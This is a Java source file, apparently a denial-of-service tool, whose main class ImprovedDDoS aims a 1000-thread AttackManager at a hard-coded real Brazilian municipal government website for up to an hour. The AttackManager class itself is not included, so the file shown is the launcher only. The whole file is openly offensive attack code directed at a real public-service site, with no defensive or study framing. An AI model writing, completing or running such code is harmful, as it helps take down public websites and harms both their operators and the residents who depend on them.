package ddosAttack;

import java.util.concurrent.*;

public class ImprovedDDoS {

    private static final String TARGET_URL = "https://capimgrosso.ba.gov.br/";

    private static final int NUM_THREADS = 1000;

    private static final int MAX_CONNECTIONS_PER_THREAD = 500;

    private static final int MAX_CONNECTIONS_TOTAL = 1000;

    public static void main(String[] args) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(NUM_THREADS);
        AttackManager attackManager = new AttackManager(executor, TARGET_URL, MAX_CONNECTIONS_PER_THREAD, MAX_CONNECTIONS_TOTAL);
        attackManager.startAttack();
        executor.shutdown();
        executor.awaitTermination(1, TimeUnit.HOURS);
    }
}
